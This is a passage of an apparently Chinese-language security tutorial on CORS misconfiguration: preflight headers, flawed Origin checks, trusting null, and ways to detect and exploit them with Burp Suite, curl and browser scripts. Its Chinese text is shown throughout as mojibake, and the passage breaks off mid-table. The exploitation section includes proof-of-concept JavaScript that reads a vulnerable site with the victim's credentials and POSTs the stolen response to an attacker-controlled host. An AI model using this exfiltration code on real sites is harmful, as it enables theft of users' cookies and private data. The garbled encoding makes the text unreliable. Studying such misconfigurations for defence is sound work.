ï¼ˆ2ï¼‰Access-Control-Request-Headers è¯¥å­—æ®µæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼ŒæŒ‡å®šæµè§ˆå™¨ CORS è¯·æ±‚ä¼šé¢å¤–å‘é€çš„å¤´ä¿¡æ¯å­—æ®µï¼Œä¸Šä¾‹æ˜¯ X-Custom-Headerâ€‹â€‹â€‹â€‹ã€‚ ä¸ºä»€ä¹ˆéœ€è¦é¢„è¯·æ±‚ï¼Ÿ å‡è¨­ä»Šå¤©æŸå€‹ Server æä¾›äº†ä¸€å€‹ API ç¶²å€å«åšï¼šhttps://example.com/data/16â€‹â€‹ï¼Œä½ åªè¦å°å®ƒç™¼é€ GETï¼Œå°±èƒ½å¤ æ‹¿åˆ° id æ˜¯ 16 çš„è³‡æ–™ï¼Œåªè¦å°å®ƒç™¼é€ DELETEï¼Œå°±å¯ä»¥æŠŠé€™ç­†è³‡æ–™åˆªé™¤ã€‚ å¦‚æœä»Šå¤©æ²’æœ‰ Preflight Request é€™å€‹æ©Ÿåˆ¶çš„è©±ï¼Œæˆ‘å°±å¯ä»¥åœ¨éš¨ä¾¿ä¸€å€‹ Domain çš„ç¶²é ä¸Šé¢ç™¼é€ä¸€å€‹ DELETE çš„ Request çµ¦é€™å€‹ APIã€‚å‰›å‰›æˆ‘æœ‰å¼·èª¿èªªç€è¦½å™¨çš„ CORS æ©Ÿåˆ¶ï¼Œé‚„æ˜¯æœƒå¹«ä½ ç™¼é€ Requestï¼Œä½†åªæ˜¯ Response è¢«ç€è¦½å™¨æ“‹ä½è€Œå·²ã€‚ å› æ­¤å‘¢ï¼Œå„˜ç®¡æ²’æœ‰ Responseï¼Œä½†æ˜¯ Server ç«¯çš„ç¢ºæ”¶åˆ°äº†é€™å€‹ Requestï¼Œå› æ­¤å°±æœƒæŠŠé€™ç­†è³‡æ–™çµ¦åˆªé™¤ã€‚ å¦‚æœæœ‰ Preflight Request çš„è©±ï¼Œåœ¨ç™¼é€å‡ºå»æ”¶åˆ°çµæœçš„æ™‚å€™ï¼Œå°±æœƒçŸ¥é“é€™å€‹ API ä¸¦æ²’æœ‰æä¾› CORSï¼Œå› æ­¤çœŸçš„ DELETE è«‹æ±‚å°±ä¸æœƒé€å‡ºï¼Œåˆ°é€™é‚Šå°±çµæŸäº†ã€‚ å…ˆç”¨ä¸€å€‹ OPTIONS çš„è«‹æ±‚å»ç¢ºèªä¹‹å¾Œçš„ Request èƒ½ä¸èƒ½é€å‡ºï¼Œé€™å°±æ˜¯ Preflight Request çš„ç›®çš„ã€‚ é¢„æ£€è¯·æ±‚çš„å›åº” æœåŠ¡å™¨æ”¶åˆ°\"é¢„æ£€\"è¯·æ±‚ä»¥åï¼Œæ£€æŸ¥äº† Originâ€‹â€‹ã€Access-Control-Request-Methodâ€‹ â€‹å’Œ Access-Control-Request-Headersâ€‹ â€‹å­—æ®µä»¥åï¼Œç¡®è®¤å…è®¸è·¨æºè¯·æ±‚ï¼Œå°±å¯ä»¥åšå‡ºå›åº”ã€‚ HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2.0.61 (Unix) Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Content-Type: text/html; charset=utf-8 Content-Encoding: gzip Content-Length: 0 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain ä¸Šé¢çš„ HTTP å›åº”ä¸­ï¼Œå…³é”®çš„æ˜¯ Access-Control-Allow-Originâ€‹â€‹ â€‹å­—æ®µï¼Œè¡¨ç¤º http://api.bob.comâ€‹â€‹ â€‹å¯ä»¥è¯·æ±‚æ•°æ®ã€‚è¯¥å­—æ®µä¹Ÿå¯ä»¥è®¾ä¸ºæ˜Ÿå·ï¼Œè¡¨ç¤ºåŒæ„ä»»æ„è·¨æºè¯·æ±‚ã€‚ Access-Control-Allow-Origin: * å¦‚æœæœåŠ¡å™¨å¦å®šäº†\"é¢„æ£€\"è¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½• CORS ç›¸å…³çš„å¤´ä¿¡æ¯å­—æ®µã€‚è¿™æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šè®¤å®šï¼ŒæœåŠ¡å™¨ä¸åŒæ„é¢„æ£€è¯·æ±‚ï¼Œå› æ­¤è§¦å‘ä¸€ä¸ªé”™è¯¯ï¼Œè¢« XMLHttpRequestâ€‹â€‹ â€‹å¯¹è±¡çš„ onerrorâ€‹â€‹ â€‹å›è°ƒå‡½æ•°æ•è·ã€‚æ§åˆ¶å°ä¼šæ‰“å°å‡ºå¦‚ä¸‹çš„æŠ¥é”™ä¿¡æ¯ã€‚ XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. æœåŠ¡å™¨å›åº”çš„å…¶ä»– CORS ç›¸å…³å­—æ®µå¦‚ä¸‹ã€‚ Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 ï¼ˆ1ï¼‰Access-Control-Allow-Methods è¯¥å­—æ®µå¿…éœ€ï¼Œå®ƒçš„å€¼æ˜¯é€—å·åˆ†éš”çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰è·¨åŸŸè¯·æ±‚çš„æ–¹æ³•ã€‚æ³¨æ„ï¼Œè¿”å›çš„æ˜¯æ‰€æœ‰æ”¯æŒçš„æ–¹æ³•ï¼Œè€Œä¸å•æ˜¯æµè§ˆå™¨è¯·æ±‚çš„é‚£ä¸ªæ–¹æ³•ã€‚è¿™æ˜¯ä¸ºäº†é¿å…å¤šæ¬¡\"é¢„æ£€\"è¯·æ±‚ã€‚ ï¼ˆ2ï¼‰Access-Control-Allow-Headers å¦‚æœæµè§ˆå™¨è¯·æ±‚åŒ…æ‹¬ Access-Control-Request-Headersâ€‹ â€‹å­—æ®µï¼Œåˆ™ Access-Control-Allow-Headersâ€‹ â€‹å­—æ®µæ˜¯å¿…éœ€çš„ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰å¤´ä¿¡æ¯å­—æ®µï¼Œä¸é™äºæµè§ˆå™¨åœ¨\"é¢„æ£€\"ä¸­è¯·æ±‚çš„å­—æ®µã€‚ ï¼ˆ3ï¼‰Access-Control-Allow-Credentials è¯¥å­—æ®µä¸ç®€å•è¯·æ±‚æ—¶çš„å«ä¹‰ç›¸åŒã€‚ ï¼ˆ4ï¼‰Access-Control-Max-Age è¯¥å­—æ®µå¯é€‰ï¼Œç”¨æ¥æŒ‡å®šæœ¬æ¬¡é¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼Œå•ä½ä¸ºç§’ã€‚ä¸Šé¢ç»“æœä¸­ï¼Œæœ‰æ•ˆæœŸæ˜¯ 20 å¤©ï¼ˆ1728000 ç§’ï¼‰ï¼Œå³å…è®¸ç¼“å­˜è¯¥æ¡å›åº” 1728000 ç§’ï¼ˆå³ 20 å¤©ï¼‰ï¼Œåœ¨æ­¤æœŸé—´ï¼Œä¸ç”¨å‘å‡ºå¦ä¸€æ¡é¢„æ£€è¯·æ±‚ã€‚ æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº” ä¸€æ—¦æœåŠ¡å™¨é€šè¿‡äº†\"é¢„æ£€\"è¯·æ±‚ï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨æ­£å¸¸çš„ CORS è¯·æ±‚ï¼Œå°±éƒ½è·Ÿç®€å•è¯·æ±‚ä¸€æ ·ï¼Œä¼šæœ‰ä¸€ä¸ª Originâ€‹â€‹ â€‹å¤´ä¿¡æ¯å­—æ®µã€‚æœåŠ¡å™¨çš„å›åº”ï¼Œä¹Ÿéƒ½ä¼šæœ‰ä¸€ä¸ª Access-Control-Allow-Originâ€‹â€‹ â€‹å¤´ä¿¡æ¯å­—æ®µã€‚ ä¸‹é¢æ˜¯\"é¢„æ£€\"è¯·æ±‚ä¹‹åï¼Œæµè§ˆå™¨çš„æ­£å¸¸ CORS è¯·æ±‚ã€‚ PUT /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com X-Custom-Header: value Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... ä¸Šé¢å¤´ä¿¡æ¯çš„ Originâ€‹ â€‹å­—æ®µæ˜¯æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ çš„ã€‚ ä¸‹é¢æ˜¯æœåŠ¡å™¨æ­£å¸¸çš„å›åº”ã€‚ Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 ä¸Šé¢å¤´ä¿¡æ¯ä¸­ï¼ŒAccess-Control-Allow-Originâ€‹ â€‹å­—æ®µæ˜¯æ¯æ¬¡å›åº”éƒ½å¿…å®šåŒ…å«çš„ã€‚ 0x04 CORS é”™è¯¯é…ç½®ç±»å‹ åå°„ Origin å¤´ å¦‚ä¸‹é…ç½®ï¼š Access-Control-Allow-Origin: http://a.com, http://c.com æˆ–è€… Access-Control-Allow-Origin: http://*.a.com è¿™ä¸¤ç§åŸŸåäº‹å®ä¸Šé…ç½®æ˜¯é”™è¯¯çš„ï¼Œå› ä¸º CORS æ ‡å‡†è§„å®šï¼ŒAccess-Control-Allow-Originâ€‹â€‹ åªèƒ½é…ç½®ä¸ºå•ä¸ª origin, nullâ€‹â€‹ æˆ– *â€‹â€‹ã€‚å¦‚æœå¼€å‘è€…æƒ³è¦å®ç°åŒæ—¶ä¸å¤šä¸ªåŸŸåå…±äº«åŸŸåçš„éœ€æ±‚ï¼Œåˆ™éœ€è¦ä¸“é—¨ç¼–å†™ä»£ç æˆ–è€…ä½¿ç”¨æ¡†æ¶æ¥ååŠ©åŠ¨æ€ç”Ÿæˆè®¿é—®æ§åˆ¶ç­–ç•¥ã€‚ æœ€ç®€å•åœ°åŠ¨æ€ç”Ÿæˆè®¿é—®æ§åˆ¶ç­–ç•¥çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨ Access-Control-Allow-Origin ä¸­åå°„è¯·æ±‚çš„ Origin å€¼ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªé”™è¯¯ Nginx é…ç½®ç¤ºä¾‹ï¼š add_header \"Access-Control-Allow-Origin\" $http_origin; // å•çº¯çš„ add_header â€œAccess-Control-Allow-Credentialsâ€ â€œtrueâ€; è¿™ç§é…ç½®éå¸¸å±é™©ï¼Œç›¸å½“äºä¿¡ä»»ä»»æ„ç½‘ç«™ï¼Œç»™æ”»å‡»è€…ç½‘ç«™æ•å¼€äº†å¤§é—¨ã€‚ä»»æ„æ”»å‡»è€…ç½‘ç«™å¯ä»¥ç›´æ¥è·¨åŸŸè¯»å–å…¶èµ„æºå†…å®¹ã€‚ Origin æ ¡éªŒé”™è¯¯ å‰ç¼€åŒ¹é…: èµ„æºæœåŠ¡å™¨åœ¨æ£€æŸ¥è¯·æ±‚ä¸­ Origin å€¼æ—¶ï¼ŒåªåŒ¹é…äº†å‰ç¼€ã€‚ä¾‹å¦‚ www.example.com æƒ³è¦å…è®¸ example.com è®¿é—®ï¼Œä½†æ˜¯åªåšäº†å‰ç¼€åŒ¹é…ï¼Œå¯¼è‡´åŒæ—¶ä¿¡ä»»äº† example.com.attack.com çš„è®¿é—®ï¼Œè€Œ example.com.attack.com æ˜¯æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„ç½‘ç«™ã€‚ åç¼€åŒ¹é…ï¼šèµ„æºæœåŠ¡å™¨åœ¨æ£€æŸ¥è¯·æ±‚ä¸­ Origin å€¼æ—¶ï¼Œåªåšäº†åç¼€åŒ¹é…ã€‚ä¾‹å¦‚ www.example.com æƒ³è¦å…è®¸ example.com è®¿é—®ï¼Œç”±äºåç¼€åŒ¹é…å‡ºé”™ï¼Œå¯¼è‡´å…è®¸ attackexample.com è®¿é—®ã€‚ æ²¡æœ‰è½¬ä¹‰ .â€‹â€‹ï¼šä¾‹å¦‚ï¼Œexample.com æƒ³è¦å…è®¸ www.example.com è®¿é—®æ—¶ï¼Œä½†æ­£åˆ™åŒ¹é…æ²¡æœ‰è½¬ä¹‰ .â€‹â€‹ï¼Œå¯¼è‡´å…è®¸ wwwaexample.com è®¿é—®ã€‚ åŒ…å«åŒ¹é…ï¼šæˆ‘ä»¬è¿˜å‘ç°æœ‰çš„ç½‘ç«™ www.example.com æƒ³è¦å…è®¸ example.comï¼Œä½†æ˜¯ Origin æ ¡éªŒå‡ºé”™ï¼Œå‡ºç°å…è®¸ ample.com è®¿é—®ã€‚ ä¿¡ä»» null RFC 6564 è§„å®šï¼Œå¦‚æœè¯·æ±‚æ¥è‡ªéšç§æ•æ„Ÿä¸Šä¸‹æ–‡æ—¶ï¼ŒOrigin å¤´çš„å€¼åº”è¯¥ä¸º nullï¼Œä½†æ˜¯å®ƒå´æ²¡æœ‰æ˜ç¡®ç•Œå®šä»€ä¹ˆæ˜¯éšç§æ•æ„Ÿä¸Šä¸‹æ–‡ã€‚ CORS åè®®å¤ç”¨äº† Origin å¤´ï¼Œæœ‰äº›å¼€å‘è€…åœ¨ç½‘ç«™ä¸Šé…ç½®ä¿¡ä»» nullï¼Œç”¨äºä¸æœ¬åœ° file é¡µé¢å…±äº«æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true ä½†æ˜¯äº‹å®ä¸Šï¼Œé™¤äº†æœ¬åœ° file é¡µé¢çš„è·¨åŸŸè¯·æ±‚ Origin å¤´ä¸º null å¤–ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥ä»ä»»æ„åŸŸä¸‹é€šè¿‡ iframe sandbox æ„é€  Origin ä¸º null çš„è·¨åŸŸè¯·æ±‚ï¼Œå¦‚ä¸‹æ˜¯ä¸€æ®µç¤ºæ„ä»£ç ï¼š XMLHttpRequest hereâ€™> è¿™å°±æ„å‘³ç€ä»»ä½•é…ç½®æœ‰ Access-Control-Allow-Origin: nullâ€‹â€‹ â€‹å’Œ Access-Control-Allow-Credentials:trueâ€‹â€‹ â€‹çš„ç½‘ç«™ç­‰åŒäºæ²¡æœ‰æµè§ˆå™¨ SOP çš„ä¿æŠ¤ï¼Œéƒ½å¯ä»¥è¢«å…¶ä»–ä»»æ„åŸŸä»¥è¿™ç§æ–¹å¼è¯»å–å†…å®¹ã€‚ e.g. var xhr=new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { alert(xhr.responseText); } } xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", true); xhr.withCredentials = true; xhr.send();'> HTTPS åŸŸä¿¡ä»» HTTP åŸŸ ä¸­é—´äººæ”»å‡»è€…å¯ä»¥å…ˆåŠ«æŒå—ä¿¡ä»» HTTP åŸŸï¼Œç„¶åé€šè¿‡è¿™ä¸ªåŸŸå‘é€è·¨åŸŸè¯·æ±‚åˆ° HTTPS ç½‘ç«™ï¼Œé—´æ¥è¯»å– HTTPS åŸŸä¸‹çš„å—ä¿æŠ¤å†…å®¹ã€‚ ä¿¡ä»»è‡ªèº«å…¨éƒ¨å­åŸŸ å¾ˆå¤šç½‘ç«™ä¸ºäº†æ–¹ä¾¿ä¼šå°† CORS é…ç½®ä¸ºä¿¡ä»»å…¨éƒ¨è‡ªèº«å­åŸŸï¼Œè¿™ç§é…ç½®ä¼šå¯¼è‡´å­åŸŸ XSS çš„å±å®³è¢«å¼ºåŒ–ã€‚ä¸ºäº†é˜²æ­¢æŸä¸ªå­åŸŸä¸Š XSS æ¼æ´çš„å±å®³å…¶ä»–å­åŸŸï¼Œæµè§ˆå™¨è®¾è®¡äº† Cookie çš„ httponly æ ‡å¿—ï¼Œç”¨äºé™åˆ¶ Javascript è¯»å– Cookieï¼Œå› æ­¤æŸä¸ªå­åŸŸ XSS ä¸èƒ½è¯»å–å¸¦æœ‰ httponly æ ‡è®°çš„ Cookieï¼Œéš¾ä»¥çªƒå–å…¶ä»–é‡è¦å­åŸŸä¸Šçš„æ•æ„Ÿå†…å®¹ã€‚ ä½†æ˜¯å¦‚æœè¿™ä¸ªåŸŸé…ç½®äº† CORS ä¸”ä¿¡ä»»å…¨éƒ¨å­åŸŸï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…¶ä»–ä»»æ„å­åŸŸä¸Š XSS æ¼æ´ï¼Œå‘é€è·¨åŸŸè¯·æ±‚åˆ°ç›®æ ‡é‡è¦åŸŸç½‘ç«™ï¼Œä»è€Œè·å–æ•æ„Ÿå†…å®¹ã€‚ â€‹Origin:*â€‹â€‹â€‹ ä¸ Credentials:trueâ€‹â€‹â€‹ å…±ç”¨ CORS è§„å®šï¼ŒAccess-Control-Allow-Origin:*â€‹â€‹ ä¸ Access-Control-Allow-Credentials:trueâ€‹â€‹ ä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚æµè§ˆå™¨ä¼šå¯¹ä¸‹é¢è¿™ç§è¯¯é…ç½®æŠ¥é”™ï¼š Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true è¿™å°±æ„å‘³ç€ï¼ŒAccess-Control-Allow-Origin:*â€‹â€‹ åªèƒ½ç”¨äºå…±äº«å…¬å¼€èµ„æºã€‚ ç¼ºå°‘ Vary:Originâ€‹â€‹â€‹ å¤´ å½“èµ„æºæœåŠ¡å™¨éœ€è¦å…±äº«å¤šä¸ªåŸŸåæ—¶ï¼Œå®ƒéœ€è¦æ¯ä¸ªä¸åŒè¯·æ±‚åŸŸçš„è·¨åŸŸè¯·æ±‚ç”Ÿæˆä¸åŒçš„è®¿é—®æ§åˆ¶ç­–ç•¥ã€‚ä½†ä¸€æ—¦è¿™ä¸ªèµ„æºå†…å®¹éœ€è¦è¢«ç¼“å­˜ï¼Œåˆ™ä¼šå¸¦æ¥ CORS å¤±æ•ˆé—®é¢˜ã€‚ä¾‹å¦‚ï¼Œc.com åŒæ—¶å…è®¸ a.com å’Œ b.com å…±äº«ã€‚c.com èµ„æºå†…å®¹é¦–å…ˆè¢« a.com è„šæœ¬è·¨åŸŸè®¿é—®åè¢«ç¼“å­˜ï¼Œå…¶ä¸­ç¼“å­˜å“åº”å¤´ä¸º Access-Control-Allow-Origin: http://a.comâ€‹â€‹â€ã€‚è¿™æ—¶ï¼Œb.com è„šæœ¬åˆ™ä¸èƒ½è¯»å–ç¼“å­˜å“åº”å†…å®¹ï¼Œå› ä¸ºç¼“å­˜å“åº”å¤´æ˜¯å…è®¸ a.com å…±äº«ï¼Œè€Œä¸æ˜¯ b.comã€‚HTTP åè®®æä¾›äº† Vary å¤´ï¼Œç”¨äºè§£å†³è¿™ç§æƒ…å†µï¼Œèµ„æºæœåŠ¡å™¨éœ€è¦åœ¨å“åº”å¤´ä¸­é…ç½® Vary:Originâ€‹â€‹ å¤´æ¥æŒ‡å¯¼ç¼“å­˜ï¼Œä¸ºæ¯ä¸ªä¸åŒçš„ Origin å¤´ç¼“å­˜ä¸€ä»½ä¸åŒçš„å†…å®¹ã€‚ 0x05 æŒ–æ˜åˆ©ç”¨ CORS çš„æ¼æ´ä¸»è¦çœ‹å½“æˆ‘ä»¬å‘èµ·çš„è¯·æ±‚ä¸­å¸¦æœ‰ Origin å¤´éƒ¨å­—æ®µæ—¶ï¼ŒæœåŠ¡å™¨çš„è¿”å›åŒ…å¸¦æœ‰ CORS çš„ç›¸å…³å­—æ®µå¹¶ä¸”å…è®¸ Origin çš„åŸŸè®¿é—®ã€‚ å˜æ¢è¯·æ±‚å¤´çš„ origin å­—æ®µï¼Œå¦‚æœè¿”å›åŒ…ä¸­çš„ Access-Control-Allow-Originâ€‹â€‹ å†…å®¹å’Œå‘é€çš„ origin å¤´å†…å®¹ç›¸åŒï¼Œåˆ™å­˜åœ¨æ­¤é—®é¢˜ã€‚ åˆ©ç”¨ å‰æï¼šå«æœ‰ CORS é…ç½®çš„ç½‘ç«™ åˆ©ç”¨ html æ ‡ç­¾å’Œè¡¨å•å‘é€è¯·æ±‚ è®¿é—®å†…ç½‘æ•æ„Ÿèµ„æº ç»•è¿‡è¿”ä¼šè¯åŠ«æŒ ä¸€èˆ¬å½¢å¼è·¨åŸŸè¯·æ±‚åˆ©ç”¨ åœ¨æ”»å‡»è€…è‡ªå·±æ§åˆ¶çš„ç½‘é¡µä¸ŠåµŒå…¥è·¨åŸŸè¯·æ±‚ï¼Œç”¨æˆ·è®¿é—®é“¾æ¥ï¼Œæ‰§è¡Œäº†è·¨åŸŸè¯·æ±‚ï¼Œä»è€Œæ”»å‡»ç›®æ ‡ã€‚ æ–¹æ³•ä¸€ï¼šæ£€æµ‹å·¥å…· GitHub - chenjj/CORScanner: ğŸ¯ Fast CORS misconfiguration vulnerabilities scanner EXP & POC Hello,this is evil page. CORS POC Exploit Exploit function corsExploit() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { //var datas=xhr.responseText; //alert(datas); //document.getElementById(\"demo\").innerHTML = alert(this.responseText); document.getElementById(\"demo\").innerHTML = alert(xhr.responseText); } } // request vuln pageï¼Œéœ€è¦æ”»å‡»çš„ç›®æ ‡ xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr.send(); } ç»•è¿‡ http_only è·å– cookie åœ¨æ”»å‡»è¿™æœåŠ¡å™¨åˆ›å»º cookiebypass.jspâ€‹â€‹ åœ¨æ”»å‡»è€…å¯æ§ç½‘ç«™åˆ›å»º steal.htmlâ€‹â€‹ cors exploit function exploit() { var xhr1; var xhr2; if (window.XMLHttpRequest) { xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); } else { xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); xhr2 = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr1.onreadystatechange = function () { if (xhr1.readyState == 4 && xhr1.status == 200) { var datas = xhr1.responseText; // æ”»å‡»è¿™æœåŠ¡å™¨åœ°å€ xhr2.open(\"POST\", \"http://mob.exp:8081/manager/cookiebypass.jsp\", \"true\"); xhr2.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xhr2.send(\"ck=\" + escape(datas)); } } // éœ€è¦æ”»å‡»çš„ç›®æ ‡ xhr1.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr1.withCredentials = true; xhr1.send(); } exploit(); è®¿é—® mob.exp:8081/manager/steal.htmlï¼Œå¯ä»¥çœ‹åˆ°è¿”å›å†…å®¹å†™å…¥ secrect.html ä¸­ã€‚ æ–¹æ³•äºŒï¼šåˆ©ç”¨ Burpsuit æ­å»ºæµ‹è¯•ç¯å¢ƒï¼ŒNginx é…ç½®å¦‚ä¸‹ï¼š é€‰æ‹© Proxy -- Options -- Match and Replaceï¼Œå‹¾é€‰ Request headerã€‚ å°†ç©ºæ›¿æ¢ä¸º Origin:foo.example.orgâ€‹â€‹â€‹ çš„ Enable æ¡†ã€‚ ç„¶ååœ¨ç½‘ç«™ä¸€é˜µä¹±ç‚¹ï¼Œæœ€ååœ¨ HTTP history æ¥ç­›é€‰å¸¦æœ‰ CORS å¤´éƒ¨çš„å€¼ï¼Œç„¶åç”¨ä»¥ä¸Šå·¥å…·æŸ¥çœ‹æ˜¯å¦æœ‰é…ç½®ç¼ºé™·ã€‚ Burpsuiteï¼šè‡ªåŠ¨åœ¨ HTTP è¯·æ±‚åŒ…ä¸­åŠ ä¸Š Origin çš„å¤´éƒ¨å­—æ®µã€‚ åœ¨ Filter by search term ä¸­è¾“å…¥ï¼šAccess-Control-Allow-Origin: foo.example.orgâ€‹â€‹ HTTP history åˆ—è¡¨ä¸­å‡ºç°ç¬¦åˆæ¡ä»¶çš„è¯·æ±‚åŒ…ï¼Œç‚¹å‡» Ctrl+Rï¼ˆå‘é€åˆ° Repeaterï¼‰ï¼Œç‚¹å‡» GOï¼Œè§‚å¯Ÿè¿”å›çš„ CORS é…ç½®ã€‚ æ–¹æ³•ä¸‰ï¼šcurl å‘½ä»¤ curl å‘½ä»¤ï¼Œè¾“å…¥ curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H \"Origin:https://example.com/\" -I æ–¹æ³•å››ï¼šæµè§ˆå™¨æµ‹è¯• åˆ©ç”¨ Ajax å‘é€ä¸€ä¸ªç®€å•è¯·æ±‚ï¼Œçœ‹æ˜¯å¦å…è®¸ã€‚ var url = 'http://172.16.10.113/xxxxmail'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.send(); // æˆ–è€… $.get(\"http://172.16.10.113/xxxxmail\") ======== # æµè§ˆå™¨æ§åˆ¶å°ç¤ºä¾‹ # åœ¨æœåŠ¡å™¨ï¼ˆè¢«æ”»å‡»ç›®æ ‡ï¼‰ 192.168.202.110 ä¸Šé…ç½®æœ‰æ¼æ´çš„ nginx.conf # æ‰“å¼€æ”»å‡»è€…çš„ç½‘ç«™ http://xxx.xxx.xxx/ï¼Œï¼ˆæˆ–è€…éšä¾¿ä¸€ä¸ªç½‘ç«™ï¼‰å†æ‰“å¼€æ§åˆ¶å° # åœ¨å…è®¸çš„åŸŸï¼ˆç½‘ç«™ï¼‰ï¼Œæ‰“å¼€æ§åˆ¶å° $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: Æ’, getAllResponseHeaders: Æ’, setRequestHeader: Æ’, overrideMimeType: Æ’, â€¦} # ä¸å…è®¸çš„åŸŸ $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: Æ’, getAllResponseHeaders: Æ’, setRequestHeader: Æ’, overrideMimeType: Æ’, â€¦} /xxxmail/xxx4/index.jsp Access to XMLHttpRequest at 'http://192.168.202.110:8081/' from origin 'http://172.16.10.113' has been blocked by CORS policy: The 'Access-Control-Allow-Origin' header has a value 'http://mt.icoremail.net' that is not equal to the supplied origin. loginCommon.c2f53.js:1 GET http://192.168.202.110:8081/ net::ERR_FAILED 200 (OK) send @ å®éªŒæµ‹è¯• ç¯å¢ƒå‡†å¤‡ æˆ‘ä»¬é¦–å…ˆä¿®æ”¹ host æ–‡ä»¶ï¼ŒåŠ ä¸Š 127.0.0.1 mob.exp 127.0.0.1 www.vuln.com è¿™æ ·æˆ‘ä»¬è®¿é—® www.vuln.com å°±ç›¸å½“äºæœåŠ¡ç«¯ã€‚æœåŠ¡ç«¯æ–°å»º corsvuln.jspã€‚ Vulnerability Page æ¥ç€åœ¨ hacker ç«¯ mob.exp æ„é€  steal.htmlï¼Œè¿™é‡Œæˆ‘ä»¬å‡è®¾æ˜¯ http://mob.exp:8081/manager/steal.html Hello,this is evil page. function loadXMLDoc() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function() { if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { var datas=xhr.responseText; alert(datas); } } // request vuln pageï¼Œå­˜åœ¨æ¼æ´çš„æ”»å‡»ç›®æ ‡ xhr.open(\"GET\",\"http://www.vuln.com:8081/cors/corsvuln.jsp\",\"true\") xhr.send(); } loadXMLDoc(); æ ¹æ®åŒæºç­–ç•¥ï¼Œè¿™æ˜¯ä¸å…è®¸çš„ï¼Œç»“æœä¹Ÿå’Œæˆ‘ä»¬æƒ³çš„ä¸€æ ·ã€‚ ä¸Šé¢è¯´è¿‡ï¼ŒåŒæºç­–ç•¥å¹¶ä¸é™åˆ¶è¯·æ±‚çš„å‘èµ·å’Œå“åº”ï¼Œåªæ˜¯æµè§ˆå™¨æ‹’ç»äº† js å¯¹å“åº”èµ„æºçš„æ“ä½œï¼Œè¿™ç‚¹æˆ‘ä»¬æŠ“åŒ…å°±å¯ä»¥çœ‹å‡ºæ¥ã€‚ï¼ˆæ‰€ä»¥è¯´æµ‹è¯•æ–¹æ³•ä¸­çš„ 1 æ˜¯ä¸å¯¹çš„ï¼‰ æˆ‘ä»¬ä¿®æ”¹ corsvuln.jsp ä½¿ç”¨ CORS ä½¿å…¶å¯ä»¥è·¨åŸŸè®¿é—®ï¼Œæ·»åŠ ä¸€ä¸ª Access-Control-Allow-Origin çš„è¿”å›å¤´ã€‚ response.setHeader(\"Access-Control-Allow-Origin\", \"http://mob.exp:8081\"); å†æ¬¡è®¿é—® mob.exp:8081/manager/steal.html å‘ç°å¯ä»¥æ­£å¸¸ alert äº†ï¼ŒæˆåŠŸå®ç°äº†è·¨åŸŸèµ„æºçš„è¯·æ±‚ã€‚ æˆ‘ä»¬åªæ˜¯åœ¨å“åº”å¤´åŠ ä¸Šäº† Access-Control-Allow-Origin: http://mob.exp:8081â€‹â€‹ æµè§ˆå™¨çœ‹åˆ°è¿™ä¸ªï¼Œè®¤ä¸ºè¿™æ˜¯æœåŠ¡ç«¯å…è®¸çš„è·¨åŸŸè¯·æ±‚ï¼Œå°±ä¸å†é˜»æ‹¦ js å¯¹è·å–å†…å®¹çš„æ“ä½œäº†ã€‚ è·å–ç”¨æˆ·å‡­è¯ æ–¹å¼ä¸€ï¼šå­˜åœ¨ç”¨æˆ·å‡­è¯ Access-Control-Allow-Origin â€œè®¿é—®æ§åˆ¶å…è®¸å‡­æ®â€å€¼ æ˜¯å¦å¯åˆ©ç”¨ å¤‡æ³¨ 